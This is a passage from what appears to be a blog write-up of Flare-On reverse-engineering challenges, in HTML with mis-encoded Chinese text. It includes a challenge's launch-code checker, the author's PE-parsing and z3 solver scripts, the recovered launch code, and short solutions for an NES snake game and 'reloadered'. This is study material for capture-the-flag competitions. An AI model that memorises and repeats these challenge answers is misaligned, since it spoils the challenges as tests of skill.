&#x27;\_oL__         7ooooooooooooLr     7|   L&quot;` |o|          |</span></span><br><span class="line"><span class="string">|                    .Jooooo|            7ooooooo&quot;       `  &#x27;o|_oL&quot;L          |</span></span><br><span class="line"><span class="string">|                    |oooooooooL         &#x27;oooooo|            &#x27;o_J7Lrooo_J_,   |</span></span><br><span class="line"><span class="string">|                     7oooooooo`          Jooooo|._            &quot;`&quot;7LJ/7r  &quot;`, |</span></span><br><span class="line"><span class="string">|                       oooooor           7oooo|.o|             __oooooo_  _| 7</span></span><br><span class="line"><span class="string">|                      |ooooo             &#x27;ooor  &quot;              7oooooooo|    |</span></span><br><span class="line"><span class="string">|                      Jooor               |o|                  &#x27;&quot;&quot;  &quot;oor    .J</span></span><br><span class="line"><span class="string">|                      oo|                                            &quot;o|   _oo</span></span><br><span class="line"><span class="string">|                     &#x27;or _                           |                     &quot; |</span></span><br><span class="line"><span class="string">|                      &quot;&quot;`                                                    |</span></span><br><span class="line"><span class="string">|                       .,&#x27;                       ___.   .______________      |</span></span><br><span class="line"><span class="string">|        ______________ooo`        ._JLooooooooooooooooooooooooooooooooooooo&quot; |</span></span><br><span class="line"><span class="string">|  |L7ooooooooooooooooL___,.Jo_Jooooooooooooooooooooooooooooooooooooooooooor` |</span></span><br><span class="line"><span class="string">ooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">AWAITING FIRST STRIKE COMMAND</span></span><br><span class="line"><span class="string">-----------------------------</span></span><br><span class="line"><span class="string">                </span></span><br><span class="line"><span class="string">PLEASE SPECIFY PRIMARY TARGET</span></span><br><span class="line"><span class="string">BY CITY AND/OR COUNTRY NAME:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line">target = input()</span><br><span class="line"></span><br><span class="line">t.typewriteln(<span class="string">&quot;\nPREPARING NUCLEAR STRIKE FOR &quot;</span> + target.upper())</span><br><span class="line">t.typewrite(<span class="string">&quot;ENTER LAUNCH CODE: &quot;</span>)</span><br><span class="line">launch_code = input().encode()</span><br><span class="line"></span><br><span class="line"><span class="comment"># encoding map coordinates</span></span><br><span class="line">x = list(launch_code.ljust(<span class="number">16</span>, <span class="string">b&#x27;\0&#x27;</span>))</span><br><span class="line">b = <span class="number">16</span> * [<span class="literal">None</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># calculate missile trajectory</span></span><br><span class="line">b[<span class="number">0</span>] = x[<span class="number">2</span>] ^ x[<span class="number">3</span>] ^ x[<span class="number">4</span>] ^ x[<span class="number">8</span>] ^ x[<span class="number">11</span>] ^ x[<span class="number">14</span>]</span><br><span class="line">b[<span class="number">1</span>] = x[<span class="number">0</span>] ^ x[<span class="number">1</span>] ^ x[<span class="number">8</span>] ^ x[<span class="number">11</span>] ^ x[<span class="number">13</span>] ^ x[<span class="number">14</span>]</span><br><span class="line">b[<span class="number">2</span>] = x[<span class="number">0</span>] ^ x[<span class="number">1</span>] ^ x[<span class="number">2</span>] ^ x[<span class="number">4</span>] ^ x[<span class="number">5</span>] ^ x[<span class="number">8</span>] ^ x[<span class="number">9</span>] ^ x[<span class="number">10</span>] ^ x[<span class="number">13</span>] ^ x[<span class="number">14</span>] ^ x[<span class="number">15</span>]</span><br><span class="line">b[<span class="number">3</span>] = x[<span class="number">5</span>] ^ x[<span class="number">6</span>] ^ x[<span class="number">8</span>] ^ x[<span class="number">9</span>] ^ x[<span class="number">10</span>] ^ x[<span class="number">12</span>] ^ x[<span class="number">15</span>]</span><br><span class="line">b[<span class="number">4</span>] = x[<span class="number">1</span>] ^ x[<span class="number">6</span>] ^ x[<span class="number">7</span>] ^ x[<span class="number">8</span>] ^ x[<span class="number">12</span>] ^ x[<span class="number">13</span>] ^ x[<span class="number">14</span>] ^ x[<span class="number">15</span>]</span><br><span class="line">b[<span class="number">5</span>] = x[<span class="number">0</span>] ^ x[<span class="number">4</span>] ^ x[<span class="number">7</span>] ^ x[<span class="number">8</span>] ^ x[<span class="number">9</span>] ^ x[<span class="number">10</span>] ^ x[<span class="number">12</span>] ^ x[<span class="number">13</span>] ^ x[<span class="number">14</span>] ^ x[<span class="number">15</span>]</span><br><span class="line">b[<span class="number">6</span>] = x[<span class="number">1</span>] ^ x[<span class="number">3</span>] ^ x[<span class="number">7</span>] ^ x[<span class="number">9</span>] ^ x[<span class="number">10</span>] ^ x[<span class="number">11</span>] ^ x[<span class="number">12</span>] ^ x[<span class="number">13</span>] ^ x[<span class="number">15</span>]</span><br><span class="line">b[<span class="number">7</span>] = x[<span class="number">0</span>] ^ x[<span class="number">1</span>] ^ x[<span class="number">2</span>] ^ x[<span class="number">3</span>] ^ x[<span class="number">4</span>] ^ x[<span class="number">8</span>] ^ x[<span class="number">10</span>] ^ x[<span class="number">11</span>] ^ x[<span class="number">14</span>]</span><br><span class="line">b[<span class="number">8</span>] = x[<span class="number">1</span>] ^ x[<span class="number">2</span>] ^ x[<span class="number">3</span>] ^ x[<span class="number">5</span>] ^ x[<span class="number">9</span>] ^ x[<span class="number">10</span>] ^ x[<span class="number">11</span>] ^ x[<span class="number">12</span>]</span><br><span class="line">b[<span class="number">9</span>] = x[<span class="number">6</span>] ^ x[<span class="number">7</span>] ^ x[<span class="number">8</span>] ^ x[<span class="number">10</span>] ^ x[<span class="number">11</span>] ^ x[<span class="number">12</span>] ^ x[<span class="number">15</span>]</span><br><span class="line">b[<span class="number">10</span>] = x[<span class="number">0</span>] ^ x[<span class="number">3</span>] ^ x[<span class="number">4</span>] ^ x[<span class="number">7</span>] ^ x[<span class="number">8</span>] ^ x[<span class="number">10</span>] ^ x[<span class="number">11</span>] ^ x[<span class="number">12</span>] ^ x[<span class="number">13</span>] ^ x[<span class="number">14</span>] ^ x[<span class="number">15</span>]</span><br><span class="line">b[<span class="number">11</span>] = x[<span class="number">0</span>] ^ x[<span class="number">2</span>] ^ x[<span class="number">4</span>] ^ x[<span class="number">6</span>] ^ x[<span class="number">13</span>]</span><br><span class="line">b[<span class="number">12</span>] = x[<span class="number">0</span>] ^ x[<span class="number">3</span>] ^ x[<span class="number">6</span>] ^ x[<span class="number">7</span>] ^ x[<span class="number">10</span>] ^ x[<span class="number">12</span>] ^ x[<span class="number">15</span>]</span><br><span class="line">b[<span class="number">13</span>] = x[<span class="number">2</span>] ^ x[<span class="number">3</span>] ^ x[<span class="number">4</span>] ^ x[<span class="number">5</span>] ^ x[<span class="number">6</span>] ^ x[<span class="number">7</span>] ^ x[<span class="number">11</span>] ^ x[<span class="number">12</span>] ^ x[<span class="number">13</span>] ^ x[<span class="number">14</span>]</span><br><span class="line">b[<span class="number">14</span>] = x[<span class="number">1</span>] ^ x[<span class="number">2</span>] ^ x[<span class="number">3</span>] ^ x[<span class="number">5</span>] ^ x[<span class="number">7</span>] ^ x[<span class="number">11</span>] ^ x[<span class="number">13</span>] ^ x[<span class="number">14</span>] ^ x[<span class="number">15</span>]</span><br><span class="line">b[<span class="number">15</span>] = x[<span class="number">1</span>] ^ x[<span class="number">3</span>] ^ x[<span class="number">5</span>] ^ x[<span class="number">9</span>] ^ x[<span class="number">10</span>] ^ x[<span class="number">11</span>] ^ x[<span class="number">13</span>] ^ x[<span class="number">15</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> b == h:</span><br><span class="line">    t.typewriteln(<span class="string">&quot;LAUNCH CODE ACCEPTED.\n\n*** RUNNING SIMULATION ***\n&quot;</span>)</span><br><span class="line">    random.shuffle(STRATEGIES)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(STRATEGIES), <span class="number">6</span>):</span><br><span class="line">        t.write(<span class="string">&#x27;\n&#x27;</span>.join(<span class="string">&#x27;&#123;:24&#125; &#123;:8&#125;&#x27;</span>.format(k, v) <span class="keyword">for</span> k, v <span class="keyword">in</span> ([(<span class="string">&#x27;STRATEGY:&#x27;</span>, <span class="string">&#x27;WINNER:&#x27;</span>), (<span class="string">&#x27;-&#x27;</span> * <span class="number">24</span>, <span class="string">&#x27;-&#x27;</span> * <span class="number">8</span>)] + [(_, <span class="string">&#x27;NONE&#x27;</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> STRATEGIES[i:i+<span class="number">6</span>]])) + <span class="string">&#x27;\n\n&#x27;</span>)</span><br><span class="line">        time.sleep(<span class="number">0.5</span>)</span><br><span class="line">    t.typewriteln(<span class="string">&quot;*** SIMULATION COMPLETED ***\n&quot;</span>)</span><br><span class="line">    t.typewriteln(<span class="string">&#x27;\nA STRANGE GAME.\nTHE ONLY WINNING MOVE IS\nNOT TO PLAY.\n&#x27;</span>)</span><br><span class="line">    eye = [<span class="number">219</span>, <span class="number">232</span>, <span class="number">81</span>, <span class="number">150</span>, <span class="number">126</span>, <span class="number">54</span>, <span class="number">116</span>, <span class="number">129</span>, <span class="number">3</span>, <span class="number">61</span>, <span class="number">204</span>, <span class="number">119</span>, <span class="number">252</span>, <span class="number">122</span>, <span class="number">3</span>, <span class="number">209</span>, <span class="number">196</span>, <span class="number">15</span>, <span class="number">148</span>, <span class="number">173</span>, <span class="number">206</span>, <span class="number">246</span>, <span class="number">242</span>, <span class="number">200</span>, <span class="number">201</span>, <span class="number">167</span>, <span class="number">2</span>, <span class="number">102</span>, <span class="number">59</span>, <span class="number">122</span>, <span class="number">81</span>, <span class="number">6</span>, <span class="number">24</span>, <span class="number">23</span>]</span><br><span class="line">    flag = fire(eye, launch_code).decode()</span><br><span class="line">    t.typewrite(<span class="string">f&quot;CONGRATULATIONS! YOU FOUND THE FLAG:\n\n<span class="subst">&#123;flag&#125;</span>\n&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    t.typewrite(<span class="string">&quot;\nIDENTIFICATION NOT RECOGNIZED BY SYSTEM\n--CONNECTION TERMINATED--\n&quot;</span>)</span><br></pre></td></tr></table></figure><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20190822162824.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20190822162824.png"></a></p><p>å½“å€¼ä¸º0çš„æ—¶å€™ï¼Œä¼šå–æœ¬èº«è¿›ç¨‹çš„å¥æŸ„ï¼Œå› ä¸ºæ˜¯å•ç‹¬è·‘pythonè„šæœ¬çš„ï¼Œæ‰€ä»¥å¾—ç¨å¾®æ”¹ä¸‹ï¼Œæ”¹æˆ</p><p><code>    trust = pydll.LoadLibrary(r&#39;F:\copy.exe&#39;)._handle</code></p><p>å®Œæ•´ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">wrong</span>():</span></span><br><span class="line">    trust = pydll.LoadLibrary(<span class="string">r&#x27;F:\copy.exe&#x27;</span>)._handle</span><br><span class="line"></span><br><span class="line">    computer = string_at(trust, <span class="number">1024</span>)</span><br><span class="line">    <span class="comment"># print(computer)</span></span><br><span class="line"></span><br><span class="line">    dirty, = struct.unpack_from(<span class="string">&#x27;=I&#x27;</span>, computer, <span class="number">60</span>)</span><br><span class="line"></span><br><span class="line">    _, _, organize, _, _, _, variety, _ =  struct.unpack_from(<span class="string">&#x27;=IHHIIIHH&#x27;</span>, computer, dirty)</span><br><span class="line">    <span class="keyword">assert</span> variety &gt;= <span class="number">144</span></span><br><span class="line"></span><br><span class="line">    participate, = struct.unpack_from(<span class="string">&#x27;=I&#x27;</span>, computer, dirty + <span class="number">40</span>)</span><br><span class="line">    <span class="keyword">for</span> insurance <span class="keyword">in</span> range(organize):</span><br><span class="line">        name, tropical, inhabitant, reader, chalk, _, _, _, _, _ = struct.unpack_from(<span class="string">&#x27;=8sIIIIIIHHI&#x27;</span>, computer, <span class="number">40</span> * insurance + dirty + variety + <span class="number">24</span>)</span><br><span class="line">        <span class="keyword">if</span> inhabitant &lt;= participate &lt; inhabitant + tropical:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    spare = bytearray(string_at(trust + inhabitant, tropical))</span><br><span class="line">    </span><br><span class="line">    issue, digital = struct.unpack_from(<span class="string">&#x27;=II&#x27;</span>, computer, dirty + <span class="number">0xa0</span>)</span><br><span class="line">    truth = string_at(trust + issue, digital)</span><br><span class="line"></span><br><span class="line">    expertise = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> expertise &lt;= len(truth) - <span class="number">8</span>:</span><br><span class="line">        nuance, seem = struct.unpack_from(<span class="string">&#x27;=II&#x27;</span>, truth, expertise)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> nuance == <span class="number">0</span> <span class="keyword">and</span> seem == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        slot = truth[expertise + <span class="number">8</span>:expertise + seem]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(slot) &gt;&gt; <span class="number">1</span>):</span><br><span class="line">            diet, = struct.unpack_from(<span class="string">&#x27;=H&#x27;</span>, slot, <span class="number">2</span> * i)</span><br><span class="line">            fabricate = diet &gt;&gt; <span class="number">12</span></span><br><span class="line">            <span class="keyword">if</span> fabricate != <span class="number">3</span>: <span class="keyword">continue</span></span><br><span class="line">            diet = diet &amp; <span class="number">4095</span></span><br><span class="line">            ready = nuance + diet - inhabitant</span><br><span class="line">            <span class="keyword">if</span> <span class="number">0</span> &lt;= ready &lt; len(spare): </span><br><span class="line">                struct.pack_into(<span class="string">&#x27;=I&#x27;</span>, spare, ready, struct.unpack_from(<span class="string">&#x27;=I&#x27;</span>, spare, ready)[<span class="number">0</span>] - trust)</span><br><span class="line"></span><br><span class="line">        expertise += seem</span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">&#x27;md5.bin&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(spare)</span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(spare).digest()</span><br><span class="line"></span><br><span class="line"><span class="comment"># def main():</span></span><br><span class="line"><span class="comment">#     print wrong().encode(&#x27;hex&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#     print &#x27;end.&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    print(wrong())</span><br></pre></td></tr></table></figure><p>å¾—åˆ°MD5ååç®—æ±‚ lauchcodeï¼Œåˆ©ç”¨z3è¿›è¡Œæ±‚è§£</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">xor = [<span class="number">212</span>, <span class="number">162</span>, <span class="number">242</span>, <span class="number">218</span>, <span class="number">101</span>, <span class="number">109</span>, <span class="number">50</span>, <span class="number">31</span>, <span class="number">125</span>, <span class="number">112</span>, <span class="number">249</span>, <span class="number">83</span>, <span class="number">55</span>, <span class="number">187</span>, <span class="number">131</span>, <span class="number">206</span>]</span><br><span class="line"></span><br><span class="line">b =  [<span class="number">0xa7</span>,<span class="number">0xbf</span>,<span class="number">0xd2</span>,<span class="number">0x9e</span>,<span class="number">0x0f</span>,<span class="number">0x01</span>,<span class="number">0x6b</span>,<span class="number">0x53</span>,<span class="number">0x68</span>,<span class="number">0x37</span>,<span class="number">0xb7</span>,<span class="number">0x60</span>,<span class="number">0x7c</span>,<span class="number">0xba</span>,<span class="number">0xb4</span>,<span class="number">0xa8</span>]</span><br><span class="line"></span><br><span class="line">b = [b[i] ^ xor[i] <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>)]</span><br><span class="line">print(b)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">x=[BitVec(<span class="string">&#x27;x[%d]&#x27;</span> % i,<span class="number">8</span>) <span class="keyword">for</span> i <span class="keyword">in</span> range(len(b))]</span><br><span class="line"></span><br><span class="line">s = Solver()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">s.add(b[<span class="number">0</span>] == x[<span class="number">2</span>] ^ x[<span class="number">3</span>] ^ x[<span class="number">4</span>] ^ x[<span class="number">8</span>] ^ x[<span class="number">11</span>] ^ x[<span class="number">14</span>])</span><br><span class="line">s.add(b[<span class="number">1</span>] == x[<span class="number">0</span>] ^ x[<span class="number">1</span>] ^ x[<span class="number">8</span>] ^ x[<span class="number">11</span>] ^ x[<span class="number">13</span>] ^ x[<span class="number">14</span>])</span><br><span class="line">s.add(b[<span class="number">2</span>] == x[<span class="number">0</span>] ^ x[<span class="number">1</span>] ^ x[<span class="number">2</span>] ^ x[<span class="number">4</span>] ^ x[<span class="number">5</span>] ^ x[<span class="number">8</span>] ^ x[<span class="number">9</span>] ^ x[<span class="number">10</span>] ^ x[<span class="number">13</span>] ^ x[<span class="number">14</span>] ^ x[<span class="number">15</span>])</span><br><span class="line">s.add(b[<span class="number">3</span>] == x[<span class="number">5</span>] ^ x[<span class="number">6</span>] ^ x[<span class="number">8</span>] ^ x[<span class="number">9</span>] ^ x[<span class="number">10</span>] ^ x[<span class="number">12</span>] ^ x[<span class="number">15</span>])</span><br><span class="line">s.add(b[<span class="number">4</span>] == x[<span class="number">1</span>] ^ x[<span class="number">6</span>] ^ x[<span class="number">7</span>] ^ x[<span class="number">8</span>] ^ x[<span class="number">12</span>] ^ x[<span class="number">13</span>] ^ x[<span class="number">14</span>] ^ x[<span class="number">15</span>])</span><br><span class="line">s.add(b[<span class="number">5</span>] == x[<span class="number">0</span>] ^ x[<span class="number">4</span>] ^ x[<span class="number">7</span>] ^ x[<span class="number">8</span>] ^ x[<span class="number">9</span>] ^ x[<span class="number">10</span>] ^ x[<span class="number">12</span>] ^ x[<span class="number">13</span>] ^ x[<span class="number">14</span>] ^ x[<span class="number">15</span>])</span><br><span class="line">s.add(b[<span class="number">6</span>] == x[<span class="number">1</span>] ^ x[<span class="number">3</span>] ^ x[<span class="number">7</span>] ^ x[<span class="number">9</span>] ^ x[<span class="number">10</span>] ^ x[<span class="number">11</span>] ^ x[<span class="number">12</span>] ^ x[<span class="number">13</span>] ^ x[<span class="number">15</span>])</span><br><span class="line">s.add(b[<span class="number">7</span>] == x[<span class="number">0</span>] ^ x[<span class="number">1</span>] ^ x[<span class="number">2</span>] ^ x[<span class="number">3</span>] ^ x[<span class="number">4</span>] ^ x[<span class="number">8</span>] ^ x[<span class="number">10</span>] ^ x[<span class="number">11</span>] ^ x[<span class="number">14</span>])</span><br><span class="line">s.add(b[<span class="number">8</span>] == x[<span class="number">1</span>] ^ x[<span class="number">2</span>] ^ x[<span class="number">3</span>] ^ x[<span class="number">5</span>] ^ x[<span class="number">9</span>] ^ x[<span class="number">10</span>] ^ x[<span class="number">11</span>] ^ x[<span class="number">12</span>])</span><br><span class="line">s.add(b[<span class="number">9</span>] == x[<span class="number">6</span>] ^ x[<span class="number">7</span>] ^ x[<span class="number">8</span>] ^ x[<span class="number">10</span>] ^ x[<span class="number">11</span>] ^ x[<span class="number">12</span>] ^ x[<span class="number">15</span>])</span><br><span class="line">s.add(b[<span class="number">10</span>] == x[<span class="number">0</span>] ^ x[<span class="number">3</span>] ^ x[<span class="number">4</span>] ^ x[<span class="number">7</span>] ^ x[<span class="number">8</span>] ^ x[<span class="number">10</span>] ^ x[<span class="number">11</span>] ^ x[<span class="number">12</span>] ^ x[<span class="number">13</span>] ^ x[<span class="number">14</span>] ^ x[<span class="number">15</span>])</span><br><span class="line">s.add(b[<span class="number">11</span>] == x[<span class="number">0</span>] ^ x[<span class="number">2</span>] ^ x[<span class="number">4</span>] ^ x[<span class="number">6</span>] ^ x[<span class="number">13</span>])</span><br><span class="line">s.add(b[<span class="number">12</span>] == x[<span class="number">0</span>] ^ x[<span class="number">3</span>] ^ x[<span class="number">6</span>] ^ x[<span class="number">7</span>] ^ x[<span class="number">10</span>] ^ x[<span class="number">12</span>] ^ x[<span class="number">15</span>])</span><br><span class="line">s.add(b[<span class="number">13</span>] == x[<span class="number">2</span>] ^ x[<span class="number">3</span>] ^ x[<span class="number">4</span>] ^ x[<span class="number">5</span>] ^ x[<span class="number">6</span>] ^ x[<span class="number">7</span>] ^ x[<span class="number">11</span>] ^ x[<span class="number">12</span>] ^ x[<span class="number">13</span>] ^ x[<span class="number">14</span>])</span><br><span class="line">s.add(b[<span class="number">14</span>] == x[<span class="number">1</span>] ^ x[<span class="number">2</span>] ^ x[<span class="number">3</span>] ^ x[<span class="number">5</span>] ^ x[<span class="number">7</span>] ^ x[<span class="number">11</span>] ^ x[<span class="number">13</span>] ^ x[<span class="number">14</span>] ^ x[<span class="number">15</span>])</span><br><span class="line">s.add(b[<span class="number">15</span>] == x[<span class="number">1</span>] ^ x[<span class="number">3</span>] ^ x[<span class="number">5</span>] ^ x[<span class="number">9</span>] ^ x[<span class="number">10</span>] ^ x[<span class="number">11</span>] ^ x[<span class="number">13</span>] ^ x[<span class="number">15</span>])</span><br><span class="line">s.add(x[<span class="number">11</span>] &gt; <span class="number">30</span>)</span><br><span class="line"></span><br><span class="line">print(s.check())</span><br><span class="line">answer=s.model()</span><br><span class="line">print(answer)</span><br><span class="line"></span><br><span class="line"><span class="comment"># import string</span></span><br><span class="line"><span class="comment"># table = string.printable</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æ±‚è§£ lauchcode</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>x</span><br><span class="line">[<span class="number">53</span>, <span class="number">67</span>, <span class="number">48</span>, <span class="number">71</span>, <span class="number">55</span>, <span class="number">84</span>, <span class="number">89</span>, <span class="number">50</span>, <span class="number">76</span>, <span class="number">87</span>, <span class="number">73</span>, <span class="number">50</span>, <span class="number">89</span>, <span class="number">88</span>, <span class="number">77</span>, <span class="number">66</span>]</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> i <span class="keyword">in</span> x:</span><br><span class="line"><span class="meta">... </span>    s += chr(i)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s</span><br><span class="line"><span class="string">&#x27;5C0G7TY2LWI2YXMB&#x27;</span></span><br></pre></td></tr></table></figure><p>æœ€åæŠŠlauchcodeå–‚ç»™ç¨‹åºå³å¯</p><h2 id="8-snake"><a href="#8-snake" class="headerlink" title="8 - snake"></a>8 - snake</h2><p>ä¸€ä¸ªNESé¢˜ç›®ï¼Œé€šè¿‡é€‰æ‹©processä¸º6502è¿›è¡Œåæ±‡ç¼–</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20190823183745.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20190823183745.png"></a></p><p>å‘ç°å½“åˆ†æ•°ä¸º0x33ï¼Œä¸”æ¸¸æˆè½®æ¬¡ä¸º 4 çš„æ—¶å€™ å¯æ‰“å°flag</p><p>æˆ–è€…æˆ‘ä»¬ç›´æ¥å°†æ­¤å¤„çš„ </p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20190823184037.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20190823184037.png"></a></p><p>$F0çš„å€¼ä¿®æ”¹ä¸º 26åç§»å¤„çš„å€¼ç›¸ç­‰å³å¯ï¼Œåˆ©ç”¨ ** fceux** è¿›è¡Œè°ƒè¯•</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20190823184150.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20190823184150.png"></a></p><h2 id="9-reloadered"><a href="#9-reloadered" class="headerlink" title="9 - reloadered"></a>9 - reloadered</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">a = [<span class="literal">None</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0xb</span>)]</span><br><span class="line">b = [<span class="number">0x7A</span>,<span class="number">0x17</span>,<span class="number">0x08</span>,<span class="number">0x34</span>,<span class="number">0x17</span>,<span class="number">0x31</span>,<span class="number">0x3B</span>,<span class="number">0x25</span>,<span class="number">0x5B</span>,<span class="number">0x18</span>,<span class="number">0x2E</span>,<span class="number">0x3A</span>,<span class="number">0x15</span>,<span class="number">0x56</span>,<span class="number">0x0E</span>,<span class="number">0x11</span>,<span class="number">0x3E</span>,<span class="number">0x0D</span>,<span class="number">0x11</span>,<span class="number">0x3B</span>,<span class="number">0x24</span>,<span class="number">0x21</span>,<span class="number">0x31</span>,<span class="number">0x06</span>,<span class="number">0x3C</span>,<span class="number">0x26</span>,<span class="number">0x7C</span>,<span class="number">0x3C</span>,<span class="number">0x0D</span>,<span class="number">0x24</span>,<span class="number">0x16</span>,<span class="number">0x3A</span>,<span class="number">0x14</span>,<span class="number">0x79</span>,<span class="number">0x01</span>,<span class="number">0x3A</span>,<span class="number">0x18</span>,<span class="number">0x5A</span>,<span class="number">0x58</span>,<span class="number">0x73</span>,<span class="number">0x2E</span>,<span class="number">0x09</span>,<span class="number">0x00</span>,<span class="number">0x16</span>,<span class="number">0x00</span>,<span class="number">0x49</span>,<span class="number">0x22</span>,<span class="number">0x01</span>,<span class="number">0x40</span>,<span class="number">0x08</span>,<span class="number">0x0A</span>,<span class="number">0x14</span>,<span class="number">0x00</span>]</span><br><span class="line"></span><br><span class="line">c = <span class="string">&quot;@flare-on.com&quot;</span></span><br><span class="line">print(len(c))</span><br><span class="line">print(len(b))</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">    r = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(c)):</span><br><span class="line">        r.append(chr(b[<span class="number">40</span>-j+i]^ord(c[i])))</span><br><span class="line">    print(<span class="string">&quot;&quot;</span>.join(r))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">passwd = <span class="string">&quot;3HeadedMonkey&quot;</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">    r = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(b)):</span><br><span class="line">        r.append(chr(b[i]^ord(passwd[i % 